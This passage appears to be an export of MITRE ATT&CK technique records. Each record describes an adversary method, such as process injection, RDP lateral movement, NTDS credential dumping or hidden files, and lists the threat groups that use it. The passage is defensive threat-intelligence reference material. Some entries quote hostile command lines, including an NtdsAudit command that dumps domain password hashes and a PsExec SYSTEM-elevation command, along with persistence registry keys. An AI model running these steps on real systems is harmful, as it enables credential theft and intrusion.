T1055.008,Ptrace System Calls,"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.   Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction).    Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.   Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. ",['[PACEMAKER] can use PTRACE to attach to a targeted process to read process memory.'],
T1027.007,Dynamic API Resolution,"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API] functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.  API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.  To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing] dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.  Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information] during execution).","['[Bazar] can hash then resolve API calls at runtime.', '[AvosLocker] has used obfuscated API calls that are retrieved by their checksums.', '[Lazarus Group] has used a custom hashing method to resolve APIs used in shellcode.', '[Pteranodon] can use a dynamic Windows hashing algorithm to map API components.', '[Brute Ratel C4] can call and dynamically resolve hashed APIs.', '[Samurai] can encrypt API name strings with an XOR-based algorithm.']",False
T1021.001,Remote Desktop Protocol,Adversaries may use [Valid Accounts] to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.  Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).   Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features] or [Terminal Services DLL] for Persistence.,"['[Kimsuky] has used RDP for direct remote point-and-click access.', '[Cobalt Strike] can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.', '[QuasarRAT] has a module for performing remote desktop access.', '[APT5] has moved laterally throughout victim environments using RDP.', '[zwShell] has used RDP for lateral movement.', '[OilRig] has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.', '[Patchwork] attempted to use RDP to move laterally.', '[FIN8] has used RDP for lateral movement.', '[Imminent Monitor] has a module for performing remote desktop access.', '[WarzoneRAT] has the ability to control an infected PC using RDP.', '[APT39] has been seen using RDP for lateral movement and persistence, in some cases employing the rdpwinst tool for mangement of multiple sessions.', '[Magic Hound] has used Remote Desktop Services to copy tools on targeted systems.', '[Wizard Spider] has used RDP for lateral movement and to deploy ransomware interactively.', '[Carbanak] enables concurrent Remote Desktop Protocol (RDP) sessions.', 'During the [SolarWinds Compromise] [APT29] used RDP sessions from public-facing systems to internal servers.', 'During [C0018] the threat actors opened a variety of ports to establish RDP connections, including ports 28035, 32467, 41578, and 46892.', 'During [Cutting Edge] threat actors used RDP with compromised credentials for lateral movement.', '[FIN7] has used RDP to move laterally in victim environments. ', 'During the [C0032] campaign, [TEMP.Veles] utilized RDP throughout an operation.', '[Silence] has used RDP for lateral movement.\t', '[Revenge RAT] has a plugin to perform RDP access. ', '[ServHelper] has commands for adding a remote desktop user and sending RDP traffic to the attacker through a reverse SSH tunnel.', '[HEXANE] has used remote desktop sessions for lateral movement.', '[Axiom] has used RDP during operations.', '[Cobalt Group] has used Remote Desktop Protocol to conduct lateral movement.', ""[SDBbot] has the ability to use RDP to connect to victim's machines."", ""[Koadic] can enable remote desktop on the victim's machine."", '[jRAT] can support RDP control.', '[njRAT] has a module for performing remote desktop access.', '[Pysa] has laterally moved using RDP connections. ', '[Pupy] can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.', '[DarkComet] can open an active screen of the victim’s machine and take control of the mouse and keyboard.', '[FIN6] used RDP to move laterally in victim networks.', '[FIN10] has used RDP to move laterally to systems in the victim environment.', '[ZxShell] has remote desktop functionality. ', '[FIN13] has remotely accessed compromised environments via Remote Desktop Services (RDS) for lateral movement.', '[Blue Mockingbird] has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts.', '[menuPass] has used RDP connections to move across the victim network.', 'During [C0015] the threat actors used RDP to access specific network hosts of interest.', '[Lazarus Group] malware SierraCharlie uses RDP for propagation.', '[APT3] enables the Remote Desktop Protocol for persistence. [APT3] has also interacted with compromised systems to browse and copy files through RDP sessions.', '[Fox Kitten] has used RDP to log in and move laterally in the target environment.', '[Leviathan] has targeted RDP credentials and used it to move through the victim environment. ', '[Dragonfly] has moved laterally via RDP.', '[APT41] used RDP for lateral movement.', '[Chimera] has used RDP to access targeted systems.', 'The [APT1] group is known to have used RDP during operations.', '[TEMP.Veles] utilized RDP throughout an operation.\t', '[APT29] has used RDP sessions from public-facing systems to internal servers.', '[Stolen Pencil] utilized RDP for direct remote point-and-click access. ', '[Dragonfly 2.0] moved laterally via RDP.', '[Cobalt Strike] can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.']",False
T1037.001,Logon Script (Windows),"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. This is done via adding a path to a script to the <code>HKCU\Environment\UserInitMprLogonScript</code> Registry key.  Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. ","['An [APT28] loader Trojan adds the Registry key <code>HKCU\\Environment\\UserInitMprLogonScript</code> to establish persistence.', '[Attor] dispatcher can establish persistence via adding a Registry key with a logon script <code>HKEY_CURRENT_USER\\Environment ""UserInitMprLogonScript"" </code>.', '[JHUHUGIT] has registered a Windows shell script under the Registry key <code>HKCU\\Environment\\UserInitMprLogonScript</code> to establish persistence.', '[KGH_SPY] has the ability to set the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key to execute logon scripts.', '[Zebrocy] performs persistence with a logon script via adding to the Registry key <code>HKCU\\Environment\\UserInitMprLogonScript</code>.', '[Cobalt Group] has added persistence by registering the file name for the next stage malware under <code>HKCU\\Environment\\UserInitMprLogonScript</code>.']",
T1055.015,ListPlanting,"Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.  List-view controls are user interface windows used to display collections of items. Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.  ListPlanting (a form of message-passing ""shatter attack"") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items. Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other [Process Injection] methods.  Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory.   Finally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.",['[InvisiMole] has used ListPlanting to inject code into a trusted process.'],
T1596.005,Scan Databases,"Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.  Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning] or [Search Open Websites/Domains] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [External Remote Services] or [Exploit Public-Facing Application]","['[APT41] uses the Chinese website fofa.su, similar to the Shodan scanning service, for passive scanning of victims.']",
T1564.001,Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).  On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.  Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.  Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.","['[QakBot] has placed its payload in hidden subdirectories.', '[XCSSET] uses a hidden folder named <code>.xcassets</code> and <code>.git</code> to embed itself in Xcode.', '[APT28] has saved files with hidden file attributes.', '[Clambling] has the ability to set its file attributes to hidden.', ""[LuminousMoth] has used malware to store malicious binaries in hidden directories on victim's USB drives."", '[WastedLocker] has copied a random file from the Windows System32 folder to the <code>%APPDATA%</code> location under a different hidden filename.', '[PlugX] can modify the characteristics of folders to hide them from the compromised user.', '[Lazarus Group] has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.', '[CoinTicker] downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].', '[Mustang Panda] [PlugX] variant has created a hidden folder on USB drives named <code>RECYCLE.BIN</code> to store malicious executables and collected data.', '[PoetRAT] has the ability to hide and unhide files.', '[AppleJeus] has added a leading <code>.</code> to plist filenames, unlisting them from the Finder app and default Terminal directory listings.', '[OSX/Shlayer] has executed a .command script from a hidden directory in a mounted DMG.', '[Tropic Trooper] has created a hidden directory under <code>C:\\ProgramData\\Apple\\Updates\\</code> and <code>C:\\Users\\Public\\Documents\\Flash\\</code>.', ""[ThiefQuest] hides a copy of itself in the user's <code>~/Library</code> directory by using a <code>.</code> at the beginning of the file name followed by 9 random characters."", '[Rocke] downloaded a file ""libprocesshider"", which could hide files on the target system.', '[LoudMiner] has set the attributes of the VirtualBox directory and VBoxVmService parent directory to ""hidden"".', ' [QuasarRAT] has the ability to set file attributes to ""hidden"" to hide files from the compromised user\'s view in Windows File Explorer.', '[OSX_OCEANLOTUS.D] sets the main loader file’s attributes to hidden.', '[InvisiMole] can create hidden system directories.', '[FIN13] has created hidden files and folders within a compromised Linux system `/tmp` directory. [FIN13] also has used `attrib.exe` to hide gathered local host information.', '[EnvyScout] can use hidden directories and files to hide malicious executables.', '[Imminent Monitor] has a dynamic debugging feature to set the file attribute to hidden.', '[ccf32] has created a hidden directory on targeted systems, naming it after the current local time (year, month, and day).', ""[Ixeshe] sets its own executable file's attributes to hidden."", '[MacSpy] stores itself in <code>~/Library/.DS_Stores/</code> ', '[Transparent Tribe] can hide legitimate directories and replace them with malicious copies of the same name.', 'Before exfiltration, [Okrum] backdoor has used hidden files to store logs and outputs from backdoor commands.', '[Agent Tesla] has created hidden folders.', '[Carberp] has created a hidden file in the Startup folder of the current user.', '[WannaCry] uses <code>attrib +h</code> to make some of its files hidden.', '[NETWIRE] can copy itself to and launch itself from hidden folders.', '[HAFNIUM] has hidden files on a compromised host.', '[Lokibot] has the ability to copy itself to a hidden file and directory.', '[iKitten] saves itself with a leading ""."" so that it\'s hidden from users by default.', '[SysUpdate] has the ability to set file attributes to hidden.', '[FruitFly] saves itself with a leading ""."" to make it a hidden file.', '[BackConfig] has the ability to set folders or files to be hidden from the Windows Explorer default view.', '[Attor] can set attributes of log files and directories to HIDDEN, SYSTEM, ARCHIVE, or a combination of those.', '[APT32] macOS backdoor hides the clientID file via a chflags function.', '[COATHANGER] creates and installs itself to a hidden installation directory.', '[DarkGate] initial installation involves dropping several files to a hidden directory named after the victim machine name.', '[Calisto] uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.', '[Explosive] has commonly set file and path attributes to hidden.', ""[Micropsia] creates a new hidden directory to store all components' outputs in a dedicated sub-folder for each."", '[Dacls] has had its payload named with a dot prefix to make it hidden from view in the Finder application.', '[Rising Sun] can modify file attributes to hide files.', 'The [Komplex] payload is stored in a hidden directory at <code>/Users/Shared/.local/kextd</code>.', ""[SLOTHFULMEDIA] has been created with a hidden attribute to insure it's not visible to the victim."", '[Machete] has the capability to exfiltrate stolen data to a hidden folder on a removable drive.']",
T1578.001,Create Snapshot,"An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance] where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.  An adversary may [Create Cloud Instance] mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.",['[Pacu] can create snapshots of EBS volumes and RDS instances.'],
T1591.001,Determine Physical Locations,"Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.  Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information] Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites] or [Social Media] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information] or [Search Open Websites/Domains] establishing operational resources (ex: [Develop Capabilities] or [Obtain Capabilities] and/or initial access (ex: [Phishing] or [Hardware Additions]",['[Magic Hound] has collected location information from visitors to their phishing sites.'],
T1137.002,Office Test,"Adversaries may abuse the Microsoft Office ""Office Test"" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.  There exist user and global Registry keys for the Office Test feature, such as:  * <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code>  Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",['[APT28] has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key <code>HKCU\\Software\\Microsoft\\Office test\\Special\\Perf</code> to execute code.'],False
T1003.003,NTDS,"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.  In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.  The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.  * Volume Shadow Copy * secretsdump.py * Using the in-built Windows tool, ntdsutil.exe * Invoke-NinjaCopy ","['[APT28] has used the ntdsutil.exe utility to export the Active Directory database for credential access.', ""[CrackMapExec] can dump hashed passwords associated with Active Directory using Windows' Directory Replication Services API (DRSUAPI), or Volume Shadow Copy."", '[Scattered Spider] has extracted the `NTDS.dit` file by creating volume shadow copies of virtual domain controller disks.', '[Sandworm Team] has used `ntdsutil.exe` to back up the Active Directory database, likely for credential access.', '[FIN13] has harvested the NTDS.DIT file and leveraged the [Impacket] tool on the compromised domain controller to locally decrypt it.', '[esentutl] can copy `ntds.dit` using the Volume Shadow Copy service.', ""[FIN6] has used Metasploit’s [PsExec] NTDSGRAB module to obtain a copy of the victim's Active Directory database.\t"", '[Volt Typhoon] has used ntds.util to create domain controller installation media containing usernames and password hashes.', '[menuPass] has used Ntdsutil to dump credentials.', '[Chimera] has gathered the SYSTEM registry and ntds.dit files from target systems. [Chimera] specifically has used the NtdsAudit tool to dump the password hashes of domain users via <code>msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv</code> and used ntdsutil to copy the Active Directory database.', 'SecretsDump and [Mimikatz] modules within [Impacket] can perform credential dumping to obtain account and password information from NTDS.dit.', '[Fox Kitten] has used Volume Shadow Copy to access credential information from NTDS.', 'During [Cutting Edge] threat actors accessed and mounted virtual hard disk backups to extract  ntds.dit.', '[Wizard Spider] has gained access to credentials via exported copies of the ntds.dit Active Directory database. [Wizard Spider] has also created a volume shadow copy and used a batch script file to collect NTDS.dit with the use of the Windows utility, ntdsutil.', '[Dragonfly] has dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers.', '[Koadic] can gather hashed passwords by gathering domain controller hashes from NTDS.', '[APT41] used ntdsutil to obtain a copy of the victim environment <code>ntds.dit</code> file.', '[Mustang Panda] has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file. [Mustang Panda] has also used <code>reg save</code> on the SYSTEM file Registry location to help extract the NTDS.dit file.', '[Ke3chang] has used NTDSDump and other password dumping tools to gather credentials.', '[HAFNIUM] has stolen copies of the Active Directory database (NTDS.DIT).', '[LAPSUS$] has used Windows built-in tool `ntdsutil` to extract the Active Directory (AD) database.', '[Dragonfly 2.0] dropped and executed SecretsDump to dump password hashes. They also obtained ntds.dit from domain controllers. ']",False
T1602.001,SNMP (MIB Dump),"Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).  The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages. The MIB may also contain device operational information, including running configuration, routing table, and interface details.  Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation. ",[],
T1001.002,Steganography,"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ","['[Axiom] has used steganography to hide its C2 communications.', '[HAMMERTOSS] is controlled via commands that are appended to image files.', '[Sliver] can encode binary data into a .PNG file for C2 communication.', 'During [Operation Ghost] [APT29] used steganography to hide the communications between the implants and their C&C servers.', '[Zox] has used the .PNG file format for C2 communications.', '[LightNeuron] is controlled via commands that are embedded into PDFs and JPGs using steganographic methods.', '[ZeroT] has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.', '[Daserf] can use steganography to hide malicious code downloaded to the victim.', '[RDAT] can process steganographic images attached to email messages to send and receive C2 commands. [RDAT] can also embed additional messages within BMP images to communicate with the [RDAT] operator.\t', 'When the [Duqu] command and control is operating over HTTP or HTTPS, Duqu uploads data to its controller by appending it to a blank JPG file.', '[SUNBURST] C2 data attempted to appear as benign XML related to .NET assemblies or as a faux JSON blob.', '[APT29] has used steganography to hide C2 communications in images.']",
T1204.001,Malicious Link,An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link] Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution] Links may also lead users to download files that require execution via [Malicious File],"['[FIN7] has used malicious links to lure victims into downloading malware.', '[BlackTech] has used e-mails with malicious links to lure victims into installing malware.\t ', '[Grandoreiro] has used malicious links to gain execution on victim machines.', '[Bazar] can gain execution after a user clicks on a malicious link to decoy landing pages hosted on Google Docs.', 'During [Night Dragon] threat actors enticed users to click on links in spearphishing emails to download malware.', '[Mustang Panda] has sent malicious links including links directing victims to a Google Drive folder.', '[Molerats] has sent malicious links via email trick users into opening a RAR archive and running an executable. ', '[Windshift] has used links embedded in e-mails to lure victims into executing malicious code.', '[OutSteel] has relied on a user to click a malicious link within a spearphishing email.', '[Kimsuky] has lured victims into clicking malicious links.', '[LazyScripter] has relied upon users clicking on links to malicious files.', '[Confucius] has lured victims into clicking on a malicious link sent through spearphishing.', 'During [Operation Spalax] the threat actors relied on a victim to click on a malicious link distributed via phishing emails.', 'During [Operation Dust Storm] the threat actors relied on a victim clicking on a malicious link sent via email.', '[NETWIRE] has been executed through convincing victims into clicking malicious links.', 'During [Operation Dream Job] [Lazarus Group] lured users into executing a malicious link to disclose private account information or provide initial access.', '[Squirrelwaffle] has relied on victims to click on a malicious link send via phishing campaigns.', '[QakBot] has gained execution through users opening malicious links. ', '[Hancitor] has relied upon users clicking on a malicious link delivered through phishing.', '[Javali] has achieved execution through victims clicking links to malicious websites.', 'During [C0021] the threat actors lured users into clicking a malicious link which led to the download of a  ZIP archive containing a malicious .LNK file.', '[SMOKEDHAM] has relied upon users clicking on a malicious link delivered through phishing.', '[FIN8] has used emails with malicious links to lure victims into installing malware.', '[TA2541] has used malicious links to cloud and web services to gain execution on victim machines.', '[APT29] has used various forms of spearphishing attempting to get a user to click on a malicous link.', '[Patchwork] has used spearphishing with links to try to get users to click, download and open malicious files.', '[APT3] has lured victims into clicking malicious links delivered through spearphishing.', '[Evilnum] has sent spearphishing emails designed to trick the recipient into opening malicious shortcut links which downloads a .LNK file.', '[Snip3] has been executed through luring victims into clicking malicious links.', '[TA505] has used lures to get users to click links in emails and attachments. For example, [TA505] makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. ', '[LuminousMoth] has lured victims into clicking malicious Dropbox download links delivered through spearphishing.', '[ObliqueRAT] has gained execution on targeted systems through luring users to click on links to malicious URLs.', '[Magic Hound] has attempted to lure victims into opening malicious links embedded in emails.', '[APT39] has sent spearphishing emails in an attempt to lure users to click on a malicious link.', '[APT32] has lured targets to download a Cobalt Strike beacon by including a malicious link within spearphishing emails.', '[Mofang] spearphishing emails required a user to click the link to connect to a compromised website.', 'During [C0011] [Transparent Tribe] relied on student targets to click on a malicious link sent via email.', '[FIN4] has lured victims to click malicious links delivered via spearphishing emails (often sent from compromised accounts).', '[Sandworm Team] has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.', '[Elderwood] has leveraged multiple types of spearphishing in order to attempt to get a user to open links.', '[Turla] has used spearphishing via a link to get users to download and run their malware.', '[Emotet] has relied upon users clicking on a malicious link delivered through spearphishing.', '[OilRig] has delivered malicious links to achieve execution on the target system.', '[EXOTIC LILY] has used malicious links to lure users into executing malicious payloads.', '[Cobalt Group] has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine.', '[Pony] has attempted to lure targets into clicking links in spoofed emails from legitimate banks.\t', '[SocGholish] has lured victims into interacting with malicious links on compromised websites for execution.', '[PLEAD] has been executed via malicious links in e-mails.', '[KOCTOPUS] has relied on victims clicking on a malicious link delivered via email.', '[ZIRCONIUM] has used malicious links in e-mails to lure victims into downloading malware.', '[Transparent Tribe] has directed users to open URLs hosting malicious content.', '[SpicyOmelette] has been executed through malicious links within spearphishing emails.', '[MuddyWater] has distributed URLs in phishing e-mails that link to lure documents.', '[Wizard Spider] has lured victims into clicking a malicious link delivered through spearphishing.', '[GuLoader] has relied upon users clicking on links to malicious documents.', '[Machete] has has relied on users opening malicious links delivered through spearphishing to execute malware.', '[Bumblebee] has relied upon a user downloading a file from a OneDrive link for execution.', '[Mustard Tempest] has lured users into downloading malware through malicious links in fake advertisements and spearphishing emails.', '[TSCookie] has been executed via malicious links embedded in e-mails spoofing the Ministries of Education, Culture, Sports, Science and Technology of Japan.', '[Sidewinder] has lured targets to click on malicious links to gain execution in the target environment.', '[Melcoz] has gained execution through victims opening malicious links.', '[APT28] has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.', '[Kerrdown] has gained execution through victims opening malicious links.', '[Saint Bot] has relied on users to click on a malicious link delivered via a spearphishing.', '[BackConfig] has compromised victims via links to URLs hosting malicious content.', '[APT33] has lured users to click links to malicious HTML applications delivered via spearphishing emails.', '[Leviathan] has sent spearphishing email links attempting to get a user to click.', '[Ember Bear] has attempted to lure users to click on a malicious link within a spearphishing email.', '[AppleJeus] spearphishing links required user interaction to navigate to the malicious website.', '[Earth Lusca]  has sent spearphishing emails that required the user to click on a malicious link and subsequently open a decoy document with a malicious loader.', '[Lazarus Group] has sent spearphishing emails in an attempt to lure users to click on a malicious link.', '[Night Dragon] enticed users to click on links in spearphishing emails to download malware.', '[Dragonfly 2.0] has used various forms of spearphishing in attempts to get users to open links.']",
T1550.001,Application Access Token,"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.  Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).   OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.  For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded. With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.  Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account. The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.  Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated. Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.","['[Peirates] can use stolen service account tokens to perform its operations. It also enables adversaries to switch between valid service accounts.', '[CreepyDrive] can use legitimate OAuth refresh tokens to authenticate with OneDrive.', 'During the [SolarWinds Compromise] [APT29] used compromised service principals to make changes to the Office 365 environment.', '[APT28] has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail.', '[APT29] has used compromised service principals to make changes to the Office 365 environment.']",False
T1547.008,LSASS Driver,"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.  Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow] an adversary can use LSA operations to continuously execute malicious payloads.","['[Wingbird] drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.', '[Pasam] establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk.']",False
T1569.002,Service Execution,Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net]  [PsExec] can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as [PsExec] and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.  Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service] during service persistence or privilege escalation.,"['[Pupy] uses [PsExec] to execute a payload or commands on a remote host.', '[DarkGate] tries to elevate privileges to <code>SYSTEM</code> using PsExec to locally execute as a service, such as <code>cmd /c c:\\temp\\PsExec.exe -accepteula -j -d -s [Target Binary]</code>.', '[Cobalt Strike] can use [PsExec] to execute a payload on a remote host. It can also use Service Control Manager to start new services.', '[InvisiMole] has used Windows services as a way to execute its malicious payload.', '[Hydraq] uses svchost.exe to execute a malicious DLL included in a new service group.', ' [Brute Ratel 